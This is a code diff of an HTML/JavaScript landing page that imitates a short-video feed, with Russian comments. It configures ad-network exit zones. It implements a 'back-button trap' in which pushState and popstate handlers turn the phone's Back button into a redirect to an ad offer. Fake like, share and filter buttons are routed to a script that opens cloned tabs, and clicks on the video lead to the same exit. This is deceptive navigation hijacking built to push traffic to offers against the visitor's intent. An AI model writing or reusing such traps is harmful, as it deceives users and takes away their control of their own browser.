@@ -10,7 +10,7 @@
   <script>
     var APP_CONFIG = {
       domain: "https://jup9.com",
-      clickMapMode: "reels",
+      clickMapMode: "off", // Выключаем встроенный ClickMap по видео, чтобы не конфликтовал с нашим Stage 1/2
 
       // --- MAIN EXIT (dual) ---
       mainExit_currentTab_zoneId: 10217421,
@@ -40,7 +40,6 @@
     * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
     html, body { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
     
-    /* Блокируем системный свайп, оставляем только клики */
     .reels-wrapper { position: relative; width: 100%; height: 100%; display: flex; flex-direction: column; cursor: pointer; background: #000; touch-action: none; }
 
     .video-layer {
@@ -134,18 +133,18 @@
 
     <div id="click-hint" class="click-hint-overlay">
       <div class="glass-btn" style="display: none;"></div>
-      <div class="next-btn" id="next-btn-s2" data-mt="mainExit" data-stop="1">
+      <div class="next-btn" id="next-btn-s2" data-target="main_play">
         <svg class="next-icon" viewBox="0 0 24 24"><path d="M9 6l6 6-6 6" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
       </div>
     </div>
 
     <div class="reels-ui">
       <div class="top-bar">
-        <svg class="back-icon" data-mt="tabUnderClick" data-stop="1" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <svg class="back-icon" data-target="settings" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
           <polyline points="15 18 9 12 15 6"></polyline>
         </svg>
 
-        <div class="filter-pill" data-mt="tabUnderClick" data-stop="1">
+        <div class="filter-pill" data-target="settings">
           <svg class="filter-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
             <polygon points="22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3"></polygon>
           </svg>
@@ -154,7 +153,7 @@
       </div>
 
       <div class="right-actions">
-        <div class="action-btn" data-mt="tabUnderClick" data-stop="1">
+        <div class="action-btn" data-target="timeline">
           <div class="icon-circle">
             <svg class="action-icon" viewBox="0 0 24 24" fill="white" stroke="none">
               <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
@@ -163,7 +162,7 @@
           <span class="action-text" id="ui-likes">93</span>
         </div>
 
-        <div class="action-btn" data-mt="tabUnderClick" data-stop="1">
+        <div class="action-btn" data-target="play_pause">
           <div class="icon-circle">
             <svg class="action-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linejoin="round">
               <path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"></path>
@@ -209,6 +208,14 @@
 
       const vib = (ms=25) => { try { navigator.vibrate && navigator.vibrate(ms); } catch {} };
 
+      const userLang = (navigator.language || navigator.userLanguage || 'en').slice(0, 2).toLowerCase();
+      const langText = document.getElementById("lang-text");
+      if(langText) langText.innerText = translations[userLang] || translations.en;
+      if (userLang === 'ar') {
+          const gb = document.querySelector('.glass-btn');
+          if(gb) gb.style.direction = 'rtl';
+      }
+
       const v1 = document.getElementById('v1');
       const v2 = document.getElementById('v2');
       const swipeHint = document.getElementById("swipe-hint");
@@ -237,26 +244,10 @@
       let touchStartY = 0;
       let touchStartX = 0;
 
-      // === КАСТОМНАЯ ЛОВУШКА НА КНОПКУ "НАЗАД" (Для телефона) ===
-      function armBackTrap() {
-        if (window.__CUSTOM_BACK_ARMED__) return;
-        window.__CUSTOM_BACK_ARMED__ = true;
-        try {
-          window.history.pushState({ customStage: 2 }, "", window.location.href);
-          window.addEventListener("popstate", (e) => {
-            if (!e.state || e.state.customStage !== 2) {
-              if (window.LANDING_EXITS?.run) window.LANDING_EXITS.run("mainExit");
-            }
-          });
-        } catch (err) {}
-      }
-
-      // === НАШ КЛОН ИЛИ НЕТ? ===
-      // Если common.js открыл вкладку с параметром __cl=1 (или мы сами дописали stage=2)
-      const isClone = urlParams.get('__cl') === '1' || urlParams.get('stage') === '2';
+      // === ПРОВЕРКА: ЕСЛИ ЭТО КЛОН (ОТКРЫТЫЙ ИЗ COMMON.JS), СРАЗУ ПОКАЗЫВАЕМ STAGE 2 ===
+      const isClone = urlParams.get('__cl') === '1';
 
       if (isClone) {
-        // Мы в новой вкладке. СРАЗУ показываем второй экран!
         stage = 2;
         swipeHint.style.display = 'flex'; 
         nextWrap.style.display = 'none';
@@ -273,9 +264,31 @@
         v1.classList.remove('active');
         v2.classList.add('active');
         v2.play().catch(()=>{});
-        armBackTrap(); 
+        
+        // Кастомная ловушка на Назад для клона
+        try {
+          window.history.pushState({ customStage: 2 }, "", window.location.href);
+          window.addEventListener("popstate", (e) => {
+            if (!e.state || e.state.customStage !== 2) {
+              if (window.LANDING_EXITS?.run) window.LANDING_EXITS.run("mainExit");
+            }
+          });
+        } catch (err) {}
       } else {
         v1.play().catch(()=>{});
+      }
+
+      function armBackTrap() {
+        if (window.__CUSTOM_BACK_ARMED__) return;
+        window.__CUSTOM_BACK_ARMED__ = true;
+        try {
+          window.history.pushState({ customStage: 2 }, "", window.location.href);
+          window.addEventListener("popstate", (e) => {
+            if (!e.state || e.state.customStage !== 2) {
+              if (window.LANDING_EXITS?.run) window.LANDING_EXITS.run("mainExit");
+            }
+          });
+        } catch (err) {}
       }
 
       function doSwapToStage2() {
@@ -310,32 +323,15 @@
         }, 450);
       }
 
-      // === ОБРАБОТКА КЛИКОВ (Прямой клик по видео / кнопке Далее) ===
+      // Клик по центральной кнопке на 1 экране (плавный переход, БЕЗ клона)
       nextBtn.addEventListener("click", (e) => {
-        e.preventDefault(); e.stopPropagation(); 
+        // Останавливаем, чтобы common.js не перехватил этот клик
+        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
         armBackTrap();
         doSwapToStage2();
       }, true);
 
-      // Глобальный перехват для пустого места на видео
-      wrapper.addEventListener("click", (e) => {
-        // Если юзер нажал на социалки (Лайк/Шер) -> игнорируем! Отдаем власть common.js
-        if (e.target?.closest?.("[data-mt]")) return; 
-        
-        if (e.target === nextBtn || e.target?.closest?.("#next-btn")) return;
-
-        if (stage === 1) {
-            // Плавный переход на видео 2
-            armBackTrap();
-            doSwapToStage2();
-        } else if (stage === 2) {
-          // Выход на оффер
-          e.preventDefault(); e.stopPropagation();
-          if (window.LANDING_EXITS?.run) window.LANDING_EXITS.run("mainExit");
-        }
-      }, true);
-
-      // === ВИБРАЦИЯ ПРИ СВАЙПЕ (Без перехода) ===
+      // TOUCH LOGIC: Shake and Vibrate
       wrapper.addEventListener('touchstart', (e) => {
         touchStartY = e.changedTouches[0].screenY;
         touchStartX = e.changedTouches[0].screenX;
@@ -358,6 +354,25 @@
           }
         }
       }, { passive: true });
+
+      // Глобальный клик (клик по пустому месту видео)
+      wrapper.addEventListener("click", (e) => {
+        // Если юзер кликнул по элементам управления (лайк, шер, назад и т.д.) -
+        // мы НИЧЕГО не делаем. Оставляем клик твоему common.js для создания клона.
+        if (e.target?.closest?.("[data-target]") || e.target?.closest?.("[data-mt]")) return; 
+        
+        if (e.target === nextBtn || e.target?.closest?.("#next-btn")) return;
+
+        if (stage === 1) {
+            // Клик по видео на 1 экране = плавный переход
+            armBackTrap();
+            doSwapToStage2();
+        } else if (stage === 2) {
+          // Клик по видео на 2 экране = mainExit
+          e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+          if (window.LANDING_EXITS?.run) window.LANDING_EXITS.run("mainExit");
+        }
+      }, true); // Use Capture
     });
   </script>
 </body>
